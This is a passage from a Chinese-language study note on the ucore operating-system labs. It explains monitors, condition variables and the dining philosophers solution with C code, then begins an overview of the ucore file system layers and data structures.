这时候会进行schedule(), 切换到其他进程<ul><li>这一步有点特别, 因为要在临界区内进行一次V操作, 然后在外面进行一次P操作检查刚刚是否进行了V操作.</li></ul></li></ul><p>如果有其他哲学家使用V操作释放了叉子, 就会调用wakeup_wait()来使该信号量的等待队列里的第一个变成RUNNALBLE, 所有使用这种资源的进程只有这个能就绪, 如果调度器调度到了这个进程就可以继续进行了.</p><p>接下来进餐sleep 10个时间片, 然后到了放下叉子. 这时候<strong>需要程序员清楚地知道</strong>放下后需要进行的操作, 这里是检查左右邻座是否在HUNGRY状态, 是的话允许他拿起叉子(通过<code>up(&amp;s[i])</code>).</p><p>大概的过程就是这样.</p><h3 id="练习2-4"><a href="#练习2-4" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>完成内核级条件变量和基于内核级条件变量的哲学家就餐问题, 内核级条件变量的设计描述</p></blockquote><p>管程里的全局变量:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_condvar[N];                            <span class="hljs-comment">// the philosopher&#x27;s state: EATING, HUNGARY, THINKING  </span><br><span class="hljs-keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="hljs-comment">// monitor</span><br></code></pre></div></td></tr></table></figure><p>而monitor是这样的(重复了一下上面的):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>大致流程跟上面差不多, 在管程内部设置了cv数组来记录是否拿到了叉子, cond_signal和cond_wait的原理和实现在知识点中.</p><div style="display: none;"><ul><li><p>管程由一个锁和多个条件变量组成，以下是管程和条件变量的结构体代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span> <span class="hljs-title">monitor_t</span>;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;        <span class="hljs-comment">// 条件变量所对应的信号量</span><br>    <span class="hljs-keyword">int</span> count;              <span class="hljs-comment">// 等待当前条件变量的等待进程总数</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;      <span class="hljs-comment">// 当前条件变量的父管程</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;      <span class="hljs-comment">// 管程锁，每次只能有一个进程执行管程代码。该值初始化为1</span><br>    <span class="hljs-keyword">semaphore_t</span> next;       <span class="hljs-comment">// the next semaphore is used to down the signaling proc itself, and the other OR wakeuped waiting proc should wake up the sleeped signaling proc.</span><br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped signaling proc</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// 当前管程中存放所有条件变量的数组</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>注意：<code>monitor</code>结构中<code>next</code>信号量的功能请在下文结合<code>cond_signal</code>说明来理解。</p></blockquote></li><li><p>初始化管程时，函数<code>monitor_init</code>会初始化传入管程的相关成员变量，并为该管程设置多个条件变量并初始化。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitor_init</span> <span class="hljs-params">(<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// 初始化管程锁为1</span><br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">// 注意这里的0</span><br>    <span class="hljs-comment">// 分配当前管程内的条件变量</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *) kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 初始化管程内条件变量的各个属性</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>当某个线程准备离开临界区、准备释放对应的条件变量时，线程会执行函数<code>cond_signal</code>。该函数同样是这次要实现的函数之一。</p><ul><li><p>如果<strong>不存在线程</strong>正在等待带释放的条件变量，则不执行任何操作</p></li><li><p>否则，对传入条件变量内置的信号执行V操作。注意：这一步可能会唤醒某个等待线程。</p></li><li><p><strong>关键的一步！</strong> 函数内部接下来会执行<code>down(&amp;(cvp-&gt;owner-&gt;next))</code>操作。由于<code>monitor::next</code>在初始化时就设置为<strong>0</strong>，所以当执行到该条代码时，无论如何，<strong>当前正在执行<code>cond_signal</code>函数的线程一定会被挂起</strong>。这也正是管程中<code>next</code>信号量的用途。</p><blockquote><p>为什么要做这一步呢？原因是<strong>保证管程代码的互斥访问</strong>。</p><p>一个简单的例子：线程1因等待条件变量a而挂起，过了一段时间，线程2释放条件变量a，此时线程1被唤醒，并等待调度。注意！<strong>此时在管程代码中，存在两个活跃线程</strong>（这里的活跃指的是正在运行/就绪线程），而这<strong>违背了管程的互斥性</strong>。因此，线程2在释放条件变量a后应当<strong>立即挂起</strong>以保证管程代码互斥。而<code>next</code>信号量便是帮助线程2立即挂起的一个信号。</p></blockquote></li></ul><p>以下是该函数的实现代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Unlock one of threads waiting on the condition variable.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cond_signal</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>   <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>   cprintf(<span class="hljs-string">&quot;cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   *      cond_signal(cv) &#123;</span><br><span class="hljs-comment">   *          if(cv.count&gt;0) &#123;</span><br><span class="hljs-comment">   *             mt.next_count ++;</span><br><span class="hljs-comment">   *             signal(cv.sem);</span><br><span class="hljs-comment">   *             wait(mt.next);</span><br><span class="hljs-comment">   *             mt.next_count--;</span><br><span class="hljs-comment"> *          &#125;</span><br><span class="hljs-comment">   *       &#125;</span><br><span class="hljs-comment">   */</span><br>    <span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>        cvp-&gt;owner-&gt;next_count ++;<br>        up(&amp;(cvp-&gt;sem));<br>        down(&amp;(cvp-&gt;owner-&gt;next));<br>        cvp-&gt;owner-&gt;next_count --;<br>   &#125;<br>   cprintf(<span class="hljs-string">&quot;cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>当某个线程需要等待锁时，则会执行<code>cond_wait</code>函数。而该函数是我们这次要实现的函数之一。</p><ul><li><p>当某个线程因为等待条件变量而<strong>准备</strong>将<strong>自身挂起</strong>前，此时条件变量中的<code>count</code>变量应自增1。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br></code></pre></div></td></tr></table></figure></li><li><p>之后当前进程应该释放<strong>所等待的条件变量所属的管程互斥锁</strong>，以便于让其他线程执行管程代码。</p><p>但如果存在一个已经在管程中、但因为执行<code>cond_signal</code>而挂起的线程，则优先继续执行该线程。</p><blockquote><p>有关“因为执行<code>cond_signal</code>而挂起的线程”的详细信息，请阅读上方<code>cond_signal</code>函数的介绍来了解。</p></blockquote><p>如果程序选择执行<code>up(&amp;(cvp-&gt;owner-&gt;next))</code>，请注意：<strong>此时mutex没有被释放</strong>。因为当前线程将被挂起，原先存在于管程中的线程被唤醒，此时管程中仍然只有一个活跃线程，不需要让新的线程进入管程。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br></code></pre></div></td></tr></table></figure></li><li><p>释放管程后，尝试获取该条件变量。如果获取失败，则当前线程将在<code>down</code>函数的内部被挂起。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">down(&amp;(cvp-&gt;sem));<br></code></pre></div></td></tr></table></figure></li><li><p>若当前线程成功获取条件变量，则当前等待条件变量的线程数减一。</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">cvp</span>-&gt;count<span class="hljs-comment">--;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>以下是最终代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Suspend calling thread on a condition variable waiting for condition Atomically unlocks</span><br><span class="hljs-comment">// mutex and suspends calling thread on conditional variable after waking up locks mutex. Notice: mp is mutex semaphore for monitor&#x27;s procedures</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">cond_wait</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>    <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>    cprintf(<span class="hljs-string">&quot;cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *         cv.count ++;</span><br><span class="hljs-comment">    *         if(mt.next_count&gt;0)</span><br><span class="hljs-comment">    *            signal(mt.next)</span><br><span class="hljs-comment">    *         else</span><br><span class="hljs-comment">    *            signal(mt.mutex);</span><br><span class="hljs-comment">    *         wait(cv.sem);</span><br><span class="hljs-comment">    *         cv.count --;</span><br><span class="hljs-comment">    */</span><br>    cvp-&gt;count++;<br>    <span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>        up(&amp;(cvp-&gt;owner-&gt;next));<br>    <span class="hljs-keyword">else</span><br>        up(&amp;(cvp-&gt;owner-&gt;mutex));<br>    down(&amp;(cvp-&gt;sem));<br>    cvp-&gt;count--;<br><br>    cprintf(<span class="hljs-string">&quot;cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>管程中函数的入口出口设计</p><ul><li><p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitorFunc</span><span class="hljs-params">()</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>      <span class="hljs-comment">// ...</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>这样做的好处有两个</p><ul><li>只有一个进程在执行管程中的函数。</li><li>避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒。</li></ul></li><li><p>针对 <strong>“避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒“</strong> 这个优点简单说一下</p><ul><li>管程中<code>wait</code>和<code>signal</code>函数的调用存在时间顺序。例如：当线程1先调用<code>signal</code>唤醒线程2并将自身线程挂起后，线程2在开始执行时将无法唤醒原先的在<code>signal</code>中挂起的线程1。</li><li>也就是说，<strong>只要存在线程在管程中执行了<code>signal</code>，那么至少存在一个线程在管程中被挂起</strong>。</li><li>此时，就只能在临界区外唤醒挂起的线程1，而这一步在代码中也得到了实现。</li></ul></li></ul></li></ul><blockquote><p>请在实验报告中给出给用户态进程/线程提供信号量机制的设计方案，并比较说明给内核级提供信号量机制的异同。</p></blockquote><p>用户态进程/线程的信号量机制可以沿用内核级信号量的实现，增加一下接口用于调用即可：</p><p>应该首先通过系统调用进行sem的初始化，设置sem.value以及sem.wait_queue</p><ul><li><p>sem_post和sem_wait：P操作和V操作接口。</p></li><li><p>sem_get_value：获取信号量当前的值。</p></li><li><p>sem_close：删除调用进程与它之前打开的一个信号量之间的关联关系。</p></li><li><p>sem_del：删除一个信号量名字并将其标记为在所有进程关闭该信号量时删除该信号量。</p></li></ul><p>不同：在用户态使用信号量时，需要进行系统调用进入到内核态进行操作。</p><blockquote><ol><li>用管程机制实现哲学家就餐问题的解决方案（基于条件变量）</li></ol></blockquote><ul><li><p>这题涉及到了两个函数，分别是<code>phi_take_forks_condvar</code>和<code>phi_put_forks_condvar</code>。与信号量所实现的哲学家就餐问题类似，大体逻辑是一致的。</p></li><li><p>首先，哲学家需要尝试获取刀叉，如果刀叉没有获取到，则等待刀叉。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I am hungry</span><br>     state_condvar[i]=HUNGRY; <span class="hljs-comment">/* 记录下哲学家i饥饿的事实 */</span><br>     <span class="hljs-comment">// try to get fork</span><br>     phi_test_condvar(i);<br>     <span class="hljs-keyword">if</span> (state_condvar[i] != EATING) &#123;<br>          cprintf(<span class="hljs-string">&quot;phi_take_forks_condvar: %d didn&#x27;t get fork and will wait\n&quot;</span>,i);<br>          cond_wait(&amp;mtp-&gt;cv[i]);<br>      &#125;<br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>之后，当哲学家放下刀叉时，如果左右两边的哲学家都满足条件可以进餐，则设置对应的条件变量。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_put_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I ate over</span><br>     state_condvar[i]=THINKING; <span class="hljs-comment">/* 哲学家进餐结束 */</span><br>     <span class="hljs-comment">// test left and right neighbors</span><br>     phi_test_condvar(LEFT); <span class="hljs-comment">/* 看一下左邻居现在是否能进餐 */</span><br>     phi_test_condvar(RIGHT); <span class="hljs-comment">/* 看一下右邻居现在是否能进餐 */</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>     <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>        up(&amp;(mtp-&gt;next));<br>     <span class="hljs-keyword">else</span><br>        up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>以下是哲学家尝试进餐的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_test_condvar</span> <span class="hljs-params">(i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING<br>            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: state_condvar[%d] will eating\n&quot;</span>,i);<br>        state_condvar[i] = EATING ;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: signal self_cv[%d] \n&quot;</span>,i);<br>        cond_signal(&amp;mtp-&gt;cv[i]) ;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">哲学家-&gt;试试拿刀叉-&gt;能拿-&gt;signal 唤醒被wait阻塞的进程-&gt;阻塞自己<br>                  |             |                   A<br>                  |             V                   |<br>                  -&gt;不能拿-&gt;wait阻塞自己             |<br>                                                    |<br>哲学家-&gt;放刀叉-&gt;让左右两边试试拿刀叉-&gt;有哲学家睡在signal 唤醒他<br></code></pre></div></td></tr></table></figure><blockquote><p>请在实验报告中回答：能否不用基于信号量机制来完成条件变量？如果不能，请给出理由，如果能，请给出设计说明和具体实现。</p></blockquote><p>自旋锁.</p></div><h1 id="Lab8"><a href="#Lab8" class="headerlink" title="Lab8"></a>Lab8</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构-1"><a href="#0-项目结构-1" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>本次实验主要是理解kern/fs目录中的部分文件，并可用user/*.c测试所实现的Simple FS文件系统是否能够正常工作。本次实验涉及到的代码包括：</p><ul><li>文件系统测试用例： user/*.c：对文件系统的实现进行测试的测试用例；</li><li>通用文件系统接口<br>user/libs/file.[ch] | dir.[ch] | syscall.c：与文件系统操作相关的用户库实行；<br>kern/syscall.[ch]：文件中包含文件系统相关的内核态系统调用接口<br>kern/fs/sysfile.[ch]|file.[ch]：通用文件系统接口和实行</li><li>文件系统抽象层-VFS<br>kern/fs/vfs/*.[ch]：虚拟文件系统接口与实现</li><li>Simple FS文件系统<br>kern/fs/sfs/*.[ch]：SimpleFS文件系统实现</li><li>文件系统的硬盘IO接口<br>kern/fs/devs/dev.[ch] | dev_disk0.c：disk0硬盘设备提供给文件系统的I/O访问接口和实现</li><li>辅助工具<br>tools/mksfs.c：创建一个Simple FS文件系统格式的硬盘镜像。（<strong>理解此文件的实现细节对理解SFS文件系统很有帮助</strong>）</li><li>对内核其它模块的扩充<br>kern/process/proc.[ch]：增加成员变量 struct fs_struct *fs_struct，用于支持进程对文件的访问；重写了do_execve load_icode等函数以支持执行文件系统中的文件。<br>kern/init/init.c：增加调用初始化文件系统的函数fs_init。</li></ul><h3 id="1-ucore文件系统概述"><a href="#1-ucore文件系统概述" class="headerlink" title="1.ucore文件系统概述"></a>1.ucore文件系统概述</h3><p>ucore的文件系统模型源于Havard的OS161的文件系统和Linux文件系统。但其实这二者都是源于传统的UNIX文件系统设计。UNIX提出了四个文件系统抽象概念：文件(file)、目录项(dentry)、索引节点(inode)和安装点(mount point)。</p><ul><li><strong>文件</strong>：UNIX文件中的内容可理解为是一有序字节buffer，文件都有一个方便应用程序识别的文件名称（也称文件路径名）。典型的文件操作有读、写、创建和删除等。</li><li><strong>目录项</strong>：目录项不是目录（又称文件路径），而是目录的组成部分。在UNIX中目录被看作一种特定的文件，而目录项是文件路径中的一部分。如一个文件路径名是“/test/testfile”，则包含的目录项为：根目录“/”，目录“test”和文件“testfile”，这三个都是目录项。一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点（见下面的描述）位置。</li><li><strong>索引节点</strong>：UNIX将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点。</li><li><strong>安装点</strong>：在UNIX中，文件系统被安装在一个特定的文件路径位置，这个位置就是安装点。所有的已安装文件系统都作为根文件系统树中的叶子出现在系统中。</li></ul><p>上述抽象概念形成了UNIX文件系统的逻辑数据结构，并需要通过一个具体文件系统的架构设计与实现把上述信息映射并储存到磁盘介质上，从而在具体文件系统的磁盘布局（即数据在磁盘上的物理组织）上具体体现出上述抽象概念。比如文件元数据信息存储在磁盘块中的索引节点上。当文件被载入内存时，内核需要使用磁盘块中的索引点来构造内存中的索引节点。</p><p>ucore模仿了UNIX的文件系统设计，ucore的文件系统架构主要由四部分组成：</p><ul><li><strong>通用文件系统访问接口层</strong>：该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li><li><strong>文件系统抽象层</strong>：向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个同样的抽象函数指针列表和数据结构屏蔽不同文件系统的实现细节。</li><li><strong>Simple FS文件系统层</strong>：一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li><li><strong>外设接口层</strong>：向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口，比如disk设备接口/串口设备接口/键盘设备接口等。</li></ul><p>文件系统的访问处理过程: 假如应用程序操作文件（打开/创建/删除/读写），首先需要通过文件系统的通用文件系统访问接口层给用户空间提供的访问接口进入文件系统内部，接着由文件系统抽象层把访问请求转发给某一具体文件系统（比如SFS文件系统），具体文件系统（Simple FS文件系统层）把应用程序的访问请求转化为对磁盘上的block的处理请求，并通过外设接口层交给磁盘驱动例程来完成具体的磁盘操作。结合用户态写文件函数write的整个执行过程，我们可以比较清楚地看出ucore文件系统架构的层次和依赖关系。</p><p><img src="../../image/ucore/image001.png" alt="image"></p><h4 id="自上而下的数据结构"><a href="#自上而下的数据结构" class="headerlink" title="自上而下的数据结构"></a>自上而下的数据结构</h4><p>从ucore操作系统不同的角度来看，ucore中的文件系统架构包含四类主要的数据结构, 它们分别是：</p><ul><li>超级块（SuperBlock），它主要从文件系统的全局角度描述特定文件系统的全局信息。它的作用范围是整个OS空间。</li><li>索引节点（inode）：它主要从文件系统的单个文件的角度它描述了文件的各种属性和数据所在位置。它的作用范围是整个OS空间。</li><li>目录项（dentry）：它主要从文件系统的文件路径的角度描述了文件路径中的一个特定的目录项（注：一系列目录项形成目录/文件路径）。它的作用范围是整个OS空间。对于SFS而言，inode(具体为struct sfs_disk_inode)对应于物理磁盘上的具体对象，dentry（具体为struct sfs_disk_entry）是一个内存实体，其中的ino成员指向对应的inode number，另外一个成员是file name(文件名).</li><li>文件（file），它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息。它的作用范围是某一具体进程。</li></ul><p>如果一个用户进程打开了一个文件，那么在ucore中涉及的相关数据结构和关系如下图所示：</p><p><img src="../../image/ucore/image-20220105195357089.png" alt="image-20220105195357089"></p><p>understand生成的关系图:</p><p><img 